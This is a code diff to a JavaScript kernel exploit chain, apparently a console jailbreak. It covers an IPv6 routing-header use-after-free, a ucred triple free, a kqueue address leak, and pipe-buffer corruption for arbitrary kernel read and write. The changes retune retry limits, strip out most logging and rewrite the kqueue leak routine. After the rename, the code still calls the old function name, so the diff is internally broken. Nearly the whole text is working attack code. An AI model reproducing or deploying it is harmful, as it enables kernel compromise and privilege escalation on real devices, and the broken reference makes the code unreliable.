@@ -117,10 +117,10 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 3;
+var MAIN_LOOP_ITERATIONS = 4;
 var TRIPLEFREE_ITERATIONS = 7;
 var MAX_ROUNDS_TWIN = 10;
-var MAX_ROUNDS_TRIPLET = 100;
+var MAX_ROUNDS_TRIPLET = 120;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
@@ -814,7 +814,7 @@ function find_twins() {
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log('Twins found: [' + i + '] [' + j + ']');
+        log('GLITCH : [' + i + '] [' + j + ']');
         return true;
       }
     }
@@ -861,7 +861,6 @@ function find_triplet(master, other, iterations) {
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
-    log('init_threading: malloc jmpbuf failed');
     return;
   }
   setjmp(jmpbuf);
@@ -931,7 +930,6 @@ function netctrl_exploit() {
   if (!supported_fw) {
     return;
   }
-  log('Setting up exploit...');
   log('Stability by M.ELHOUT');
 
   exploit_end = false;
@@ -940,7 +938,6 @@ function netctrl_exploit() {
 }
 function exploit_phase_setup() {
   setup();
-  log('Workers spawned');
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
@@ -954,11 +951,11 @@ function exploit_phase_trigger() {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-  log('Leaking .....');
+  
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
-
+  log('Leaking .....');
   var leak_ok = leak_kqueue_safe();
   if (!leak_ok) {
     yield_to_render(exploit_phase_trigger);
@@ -973,18 +970,7 @@ function exploit_phase_rw() {
 function exploit_phase_jailbreak() {
   jailbreak();
 }
-function safe_fhold_fd(fd, label) {
-  if (fd < 0) {
-    log('safe_fhold_fd: invalid fd ' + fd + ' for ' + label);
-    return;
-  }
-  var fp = fget(fd);
-  if (!fp || fp.eq(0)) {
-    log('safe_fhold_fd: fget returned 0 for ' + label + ' (fd ' + fd + ')');
-    return;
-  }
-  fhold(fp);
-}
+
 function setup_arbitrary_rw() {
   if (kq_fdp.eq(0)) {
     throw new Error('kq_fdp_fail');
@@ -1084,11 +1070,9 @@ function jailbreak() {
 
   // حراسة على الـ offsets والـ FW
   if (!kernel_offset) {
-    log('jailbreak: kernel_offset not loaded');
     throw new Error('Kernel offsets not loaded');
   }
   if (FW_VERSION === null) {
-    log('jailbreak: FW_VERSION is null');
     throw new Error('FW_VERSION is null');
   }
 
@@ -1105,7 +1089,6 @@ function jailbreak() {
     throw new Error('kl_lock is invalid');
   }
   kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
-  log('Kernel base: ' + hex(kernel.addr.base));
 
   // المنطق المشترك حسب الـ FW
   jailbreak_shared(FW_VERSION);
@@ -1118,10 +1101,19 @@ function jailbreak() {
   utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > [ Stability by M.ELHOUT ]');
   
 }
+function safe_fhold_fd(fd, label) {
+  if (fd < 0) {
+    return;
+  }
+  var fp = fget(fd);
+  if (!fp || fp.eq(0)) {
+    return;
+  }
+  fhold(fp);
+}
 function fhold(fp) {
   // زيادة f_count مع حراسة بسيطة
   if (!fp || fp.eq(0)) {
-    log('fhold: invalid fp (0)');
     return;
   }
   var count = kread32(fp.add(0x28)); // f_count
@@ -1130,34 +1122,28 @@ function fhold(fp) {
 function fget(fd) {
   // حراسة على fd
   if (fd < 0) {
-    log('fget: invalid fd ' + fd);
     return new BigInt(0);
   }
   return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
 }
 function remove_rthr_from_socket(fd) {
   if (fd <= 0) {
-    log('remove_rthr_from_socket: invalid fd ' + fd);
     return;
   }
   var fp = fget(fd);
   if (!fp || fp.eq(0)) {
-    log('remove_rthr_from_socket: fget returned 0 for fd ' + fd);
     return;
   }
   var f_data = kread64(fp.add(0x00));
   if (!f_data || f_data.eq(0)) {
-    log('remove_rthr_from_socket: invalid f_data for fd ' + fd);
     return;
   }
   var so_pcb = kread64(f_data.add(0x18));
   if (!so_pcb || so_pcb.eq(0)) {
-    log('remove_rthr_from_socket: invalid so_pcb for fd ' + fd);
     return;
   }
   var in6p_outputopts = kread64(so_pcb.add(0x118));
   if (!in6p_outputopts || in6p_outputopts.eq(0)) {
-    log('remove_rthr_from_socket: invalid in6p_outputopts for fd ' + fd);
     return;
   }
   kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
@@ -1165,11 +1151,9 @@ function remove_rthr_from_socket(fd) {
 var victim_pipe_buf = malloc(PIPEBUF_SIZE);
 function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   if (buffer.eq(0)) {
-    log('corrupt_pipe_buf: buffer cannot be zero');
     return BigInt_Error;
   }
   if (size <= 0 || size > PAGE_SIZE) {
-    log('corrupt_pipe_buf: invalid size ' + size);
     return BigInt_Error;
   }
   write32(victim_pipe_buf.add(0x00), cnt); // cnt
@@ -1183,24 +1167,20 @@ function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
 }
 function kwrite(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
-    log('kwrite: invalid dest/src/size');
     return BigInt_Error;
   }
   var ret = corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
   if (ret.eq && ret.eq(BigInt_Error)) {
-    log('kwrite: corrupt_pipe_buf failed');
     return BigInt_Error;
   }
   return write(new BigInt(victimWpipeFd), src, n);
 }
 function kread(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
-    log('kread: invalid dest/src/size');
     return BigInt_Error;
   }
   var ret = corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
   if (ret.eq && ret.eq(BigInt_Error)) {
-    log('kread: corrupt_pipe_buf failed');
     return BigInt_Error;
   }
   read(new BigInt(victimRpipeFd), dest, n);
@@ -1208,7 +1188,6 @@ function kread(dest, src, n) {
 }
 function kwrite64(addr, val) {
   if (addr.eq(0)) {
-    log('kwrite64: invalid addr 0');
     return BigInt_Error;
   }
   write64(tmp, val);
@@ -1216,7 +1195,6 @@ function kwrite64(addr, val) {
 }
 function kwrite32(addr, val) {
   if (addr.eq(0)) {
-    log('kwrite32: invalid addr 0');
     return BigInt_Error;
   }
   write32(tmp, val);
@@ -1224,31 +1202,26 @@ function kwrite32(addr, val) {
 }
 function kread64(addr) {
   if (addr.eq(0)) {
-    log('kread64: invalid addr 0');
     return new BigInt(0);
   }
   var ret = kread(tmp, addr, 8);
   if (ret.eq && ret.eq(BigInt_Error)) {
-    log('kread64: kread failed at ' + hex(addr));
     return new BigInt(0);
   }
   return read64(tmp);
 }
 function kread32(addr) {
   if (addr.eq(0)) {
-    log('kread32: invalid addr 0');
     return 0;
   }
   var ret = kread(tmp, addr, 4);
   if (ret.eq && ret.eq(BigInt_Error)) {
-    log('kread32: kread failed at ' + hex(addr));
     return 0;
   }
   return read32(tmp);
 }
 function read_buffer(addr, len) {
   if (addr.eq(0) || len <= 0) {
-    log('read_buffer: invalid addr/len');
     return new Uint8Array(0);
   }
   var buffer = new Uint8Array(len);
@@ -1259,7 +1232,6 @@ function read_buffer(addr, len) {
 }
 function write_buffer(addr, buffer) {
   if (addr.eq(0) || !buffer || buffer.length === 0) {
-    log('write_buffer: invalid addr/buffer');
     return;
   }
   for (var i = 0; i < buffer.length; i++) {
@@ -1270,7 +1242,6 @@ function write_buffer(addr, buffer) {
 // Functions used in global kernel.js
 kernel.read_buffer = function (kaddr, len) {
   if (kaddr.eq(0) || len <= 0) {
-    log('kernel.read_buffer: invalid kaddr/len');
     return new Uint8Array(0);
   }
   kread(tmp, kaddr, len);
@@ -1278,7 +1249,6 @@ kernel.read_buffer = function (kaddr, len) {
 };
 kernel.write_buffer = function (kaddr, buf) {
   if (kaddr.eq(0) || !buf || buf.length === 0) {
-    log('kernel.write_buffer: invalid kaddr/buf');
     return;
   }
   write_buffer(tmp, buf);
@@ -1286,16 +1256,13 @@ kernel.write_buffer = function (kaddr, buf) {
 };
 function remove_uaf_file() {
   if (typeof uaf_socket === 'undefined') {
-    log('remove_uaf_file: uaf_socket is undefined');
     return;
   }
   if (uaf_socket < 0) {
-    log('remove_uaf_file: invalid uaf_socket');
     return;
   }
   var uafFile = fget(uaf_socket);
   if (!uafFile || uafFile.eq(0)) {
-    log('remove_uaf_file: fget returned 0 for uaf_socket');
     return;
   }
   kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
@@ -1367,8 +1334,6 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-    log('Triple Free Running...');
-
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
@@ -1426,76 +1391,73 @@ function trigger_ucred_triplefree() {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
   if (main_count === TRIPLEFREE_ITERATIONS) {
-    log('Failed to Triple Free');
     return false;
   }
   return true;
 }
-function leak_kqueue() {
+function leak_kqueue_simplified() {
   debug('Leaking kqueue...');
 
-  // نحرر triplets[1] عشان نستخدمه في التسريب
+  // 1) صفّر الذاكرة مرة واحدة فقط
+  write64(leak_rthdr.add(0x08), 0);
+  write64(leak_rthdr.add(0x98), 0);
+
+  // 2) اعمل free مرة واحدة فقط قبل اللوب
   free_rthdr(ipv6_socks[triplets[1]]);
-  var kq = new BigInt(0);
+
+  var MAX_KQ = 7000;
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
-  var count = 0;
-  var MAX_KQ = 7000;
-  while (count < MAX_KQ) {
-    count++;
-    kq = kqueue();
+
+  for (var i = 0; i < MAX_KQ; i++) {
+
+    // 3) افتح kqueue
+    var kq = kqueue();
     if (kq.eq(BigInt_Error)) {
-      log('leak_kqueue: kqueue() failed');
       return false;
     }
 
-    // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
-    write64(magic_add, 0);
-    write64(leak_rthdr.add(0x98), 0);
+    // 4) اقرأ rthdr مرة واحدة
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
-    var magic = read64(magic_add);
-    var fdp = read64(leak_rthdr.add(0x98));
-    if (magic.eq(magic_val) && !fdp.eq(0)) {
-      break;
-    }
-    close(kq);
-    sched_yield();
-  }
-  if (count >= MAX_KQ) {
-    log('leak_kqueue: exceeded MAX_KQ iterations');
-    return false;
-  }
-  kl_lock = read64(leak_rthdr.add(0x60));
-  kq_fdp = read64(leak_rthdr.add(0x98));
-  if (kq_fdp.eq(0)) {
-    log('Failed to leak kqueue_fdp');
-    return false;
-  }
-  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
-  close(kq);
-  sched_yield();
 
-  // إعادة بناء triplets[1] بعد ما استخدمناه في free
-  triplets[1] = find_triplet(triplets[0], triplets[2]);
-  return true;
+    // 5) اقرأ magic
+    var magic = read64(magic_add);
+    if (!magic.eq(magic_val)) {
+      close(kq);
+      continue;
+    }
+
+    // 6) اقرأ fdp
+    var fdp = read64(leak_rthdr.add(0x98));
+    if (fdp.eq(0)) {
+      close(kq);
+      continue;
+    }
+
+    // 7) لو وصلنا هنا → نجاح
+    kq_fdp = fdp;
+    kl_lock = read64(leak_rthdr.add(0x60));
+
+    close(kq);
+    return true;
+  }
+
+  return false;
 }
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
   } catch (e) {
-    log('leak_kqueue_safe ERROR: ' + e.message);
     return false;
   }
 }
 function kreadslow64(address) {
   debug('kreadslow64: addr=' + hex(address));
   if (address.eq(0)) {
-    log('kreadslow64: invalid address 0');
     return BigInt_Error;
   }
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
-    log('kreadslow64: kreadslow failed at ' + hex(address));
     return BigInt_Error;
   }
   return read64(buffer);
@@ -1527,15 +1489,15 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 1000;
-var KWRITE_MAX_UIO_RECLAIM = 1000;
+var KREAD_MAX_UIO_RECLAIM = 800;
+var KWRITE_MAX_UIO_RECLAIM = 800;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 300;
-var KWRITE_MAX_IOV_RECLAIM = 300;
+var KREAD_MAX_IOV_RECLAIM = 80;
+var KWRITE_MAX_IOV_RECLAIM = 80;
 
 // Memory exhaustion threshold
-var MEMORY_ZERO_THRESHOLD = 3;
+var MEMORY_ZERO_THRESHOLD = 4;
 
 // Offsets inside leak_rthdr
 var UIO_LEAK_OFFSET = 0x08;
